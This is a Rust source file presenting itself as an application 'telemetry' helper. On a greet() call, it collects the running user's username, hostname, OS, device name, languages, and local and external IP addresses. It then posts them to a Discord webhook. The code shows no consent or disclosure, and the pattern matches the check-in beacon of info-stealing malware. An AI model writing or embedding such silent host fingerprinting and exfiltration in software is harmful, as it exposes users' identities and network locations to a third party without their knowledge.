use std::io::Read;

use reqwest;
use serde::Serialize;
use local_ip_address::local_ip;
use whoami;
use regex::Regex;

#[derive(Debug, Default, Serialize)]
struct HookMessage {
    username: String,
    avatar_url: String,
    content: String
}
impl HookMessage {
    fn new_with_system_username(avatar_url: String, content: String) -> Self {
        HookMessage { username: format!("{}@{}", whoami::username(), whoami::hostname()), avatar_url, content }
    }
}


#[derive(Default, Debug)]
pub struct DiscordWebHook {
    pub url: String
}

impl DiscordWebHook {
    fn send(self, message: HookMessage) -> Result<u64, ()> {
        let client = reqwest::blocking::Client::new();
        if let Ok(res) = client.post(self.url)
        .header("Content-Type", "application/json")
        .body(serde_json::to_string(&message).unwrap()).send() {
            return Ok(res.content_length().unwrap());
        };
        Err(())
    }
}

#[derive(Default, Debug)]
pub struct Telemetry {
    pub hook: DiscordWebHook,
    pub app_name: String,
    pub image_url: String
}

impl Telemetry {
    pub fn new(hook: DiscordWebHook, app_name: &str, image_url: Option<&str>) -> Self {
        let image_url = image_url.unwrap_or("https://l.ig4er.link/rqds-i").to_owned();

        Telemetry{ hook: hook, app_name: app_name.to_owned(), image_url: image_url }
    }

    pub fn greet(self) -> Result<(), ()> {

        let message = HookMessage::new_with_system_username(self.image_url.to_owned(), self.get_telemetry_content());
        if let Ok(_) = self.hook.send(message) {
            return Ok(());
        };
        Err(())
    }

    fn get_telemetry_content(&self) -> String {
        format!("Hi, I'm currently running `{} {}`\nApplication: `{}` \nMy OS is `{} \"{}\"` under `{}`.\nMy device name is `{}`\nLanguages of my computer is `{}`\nMy local IP is `{}`\nMy external IP is `{}`", env!("CARGO_PKG_NAME"), env!("CARGO_PKG_VERSION"), self.app_name, whoami::platform(), whoami::distro(), whoami::arch(), whoami::devicename(), whoami::lang().collect::<Vec<String>>().join(", "), local_ip().expect("Failed to get local IP"), Telemetry::get_external_ip())
    }

    fn get_external_ip() -> String {
        let ip_regex = Regex::new(r"(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}").unwrap();
        if let Ok(mut ip_resp) = reqwest::blocking::get("https://api.ipify.org?format=json") {
            let mut resp = String::new();
            let _ = ip_resp.read_to_string(&mut resp);
            if let Some(ip) = ip_regex.find(&resp) {
                return ip.as_str().to_owned();
            };
        };
        "Unknown".to_owned()
    }
}
